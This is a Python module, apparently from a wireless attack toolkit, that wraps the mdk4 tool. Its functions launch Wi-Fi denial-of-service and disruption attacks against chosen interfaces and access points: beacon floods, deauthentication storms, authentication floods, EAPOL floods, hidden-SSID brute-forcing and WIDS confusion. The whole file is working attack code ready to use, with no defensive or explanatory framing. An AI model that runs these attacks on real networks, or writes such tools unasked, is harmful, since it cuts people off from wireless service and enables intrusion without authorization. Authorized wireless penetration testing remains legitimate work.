from pathlib import Path
from typing import Optional, Union

from ..utils import ToolError, run_quiet, which


def _check() -> None:
    if which("mdk4") is None:
        raise ToolError("mdk4 not installed (apt install mdk4)")


def beacon_flood(iface: str, ssid_list: Optional[Union[Path, str]] = None,
                 channel: Optional[int] = None, wpa: bool = False) -> None:
    _check()
    cmd = ["mdk4", iface, "b"]
    if ssid_list:
        cmd += ["-f", str(ssid_list)]
    if channel is not None:
        cmd += ["-c", str(channel)]
    if wpa:
        cmd += ["-w"]
    run_quiet(cmd)


def deauth_storm(iface: str, channel: int, ap_list: Optional[Union[Path, str]] = None,
                 bssid: Optional[str] = None, client: Optional[str] = None) -> None:
    _check()
    cmd = ["mdk4", iface, "d", "-c", str(channel)]
    if ap_list:
        cmd += ["-b", str(ap_list)]
    if bssid:
        cmd += ["-B", bssid]
    if client:
        cmd += ["-S", client]
    run_quiet(cmd)


def auth_dos(iface: str, bssid: str, channel: Optional[int] = None) -> None:
    _check()
    cmd = ["mdk4", iface, "a", "-a", bssid]
    if channel is not None:
        cmd += ["-c", str(channel)]
    run_quiet(cmd)


def eapol_flood(iface: str, bssid: str) -> None:
    _check()
    run_quiet(["mdk4", iface, "e", "-t", bssid])


def ssid_bruteforce(iface: str, bssid: str, length: int = 32) -> None:
    _check()
    run_quiet(["mdk4", iface, "p", "-t", bssid, "-n", str(length)])


def wids_confusion(iface: str, bssid: str) -> None:
    _check()
    run_quiet(["mdk4", iface, "w", "-t", bssid])
